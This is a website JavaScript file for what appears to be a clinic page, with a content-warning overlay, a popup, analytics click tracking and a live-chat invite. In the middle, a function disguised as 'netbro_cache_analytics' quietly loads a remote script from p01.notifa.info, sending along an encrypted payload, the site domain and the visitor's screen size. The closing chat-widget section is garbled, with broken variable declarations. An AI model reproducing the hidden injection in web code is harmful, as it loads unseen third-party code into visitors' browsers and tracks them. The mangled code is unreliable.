$(function() {
    $(".shock").each(function() {
        $(this).wrap("<span class='shock_wrap'></span>");
    })
    $(".shock_wrap").append('<span class="shock_block"><span>Gambar adalah konten yang mengejutkan !! Pertimbangkan sebelum melihat <p style="clear:both;"></p><a class="shock_click" href="#">Click pada tampilan</a></span></span>');
    $(".shock_click").click(function() {
        $(this).parent().parent().animate({ "opacity": 0 }, 500);
        return false;
    });

    // Pop Up
    $(".popup .head-top .col3 img").click(function() {
        $(".wrap-pop").addClass("hidden");
        timeoutreturn();
    });
    setTimeout(function() {
        $(".wrap-pop").removeClass("hidden");
    }, 1000);

    function timeoutreturn() {
        setTimeout(function() {
            $(".wrap-pop").removeClass("hidden");
        }, 20000);
    }
    $(".frm .iputxt").focus(function(event) {
        /* Act on the event */
        clearTimeout(hidden);
    });
});

if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) { fn(); }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mpVcKnM1rfE3PMMbzNvrO7TW2M7vPw5CP%2br%2fDG5bidVDHJkoW5ksQFz2ODKbq16qZGzyJlhRMjfOZjPnwztUcZM3woV14UiJeAHNjYGBnvx91RPgZTt5FRkfc8k7G61jSkV80te8ZAwFc3bEvsUOSQxZSnQ%2fMRZrNDoQEMHLZcmx2685UGBqFGmbTGw0hHpSKLPBXd7SYsh3AXujvtUU0bY8mhcM%2f3uq49uFwqXKU8jOqf7FQWTm7WLmvp6GrWmuPMPAO3a5XdQndLSNn4gdvhxfocWtGfKdgE17KOXR%2bxeWU7R9QQKl6lJmGQOjV5Sg4YF5%2bbSMJwFrpw3i6WOYD43uiCth9l2JqPnMmDC%2f7W%2bUt2jCa8mmdjgDzEwifvuoacoAinNCX3an2p2G4fwvB28BGLapPQohHOSCvZeR3BZEQhbWjQ5I0I3PoZgTYQ9tyWX0HoOCjZUeh1l6HLuppmN96dD7ARdhyksUNA4b2NVWWbncPCJa6vyJnNE2jzNmYkpQry26da8mUn5WTOmNb6EycbRgOFXre9ZT6x4Tw1jhxXjAJYynD5w%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };

     window.addEventListener('load', function() {
        jQuery('div.popup-ngu a.tuvan, a.dathen').click(function() {
            ga('send', 'event', 'button', 'click', 'chat');
        })

        jQuery('a img[src="http://namkhoa.dakhoahoancau.vn/img/banner-trai2.gif"]').parent().click(function() {
            ga('send', 'event', 'button', 'click', 'chat');
        })

        jQuery('[href^="http://ktz.zoossoft.net"]').click(function() {
            ga('send', 'event', 'link', 'click', 'chat')
        })

        jQuery('.hoancau-alo-phone').click(function() {
            setTimeout(function() {
                jQuery('button:contains(Click untuk diingat)').click(function() {
                    ga('send', 'event', 'button', 'click', 'gui');
                })
            }, 1500)
        })

        jQuery('[name="btn_sdt_goilai"]').click(function() {
            ga('send', 'event', 'button', 'click', 'gui');
        })

    });

     // Last
     var w = screen.width;
        var h = screen.height;
        var d = (w-240)/2;
            r Invite_top=d1;
        //Introduction:vertically floating icon margin

        var L     var d1 = (h-240)/2;
        var Invite_ToRight=0;
        //Introduction:floating icon should align horizontally,1 is align right,0 is align left.
        var Invite_left=d;
        //Introduction:horizongtal floating icon margin
        var Invite_ToBottom=0;
        //Introduction:floating icon should align vertically,1 is align bottom,0 is align top.
        vaiveAutoInvite0='Hello，My friend coming from %IP%'; 
        var LiveAutoInvite1='proactive invitation from the first page; ';
        var LiveAutoInvite2='main fuctions of Live Reception<BR>1、proactive invitation<BR>2、real time communacation<BR>3、check real time visit development<BR>4、track visit footstep<BR>5、inside dialog<BR>6、Bi-directional transmission without plugins<BR><BR><b>if you have any question please accept this invitation to start real time communication</b>';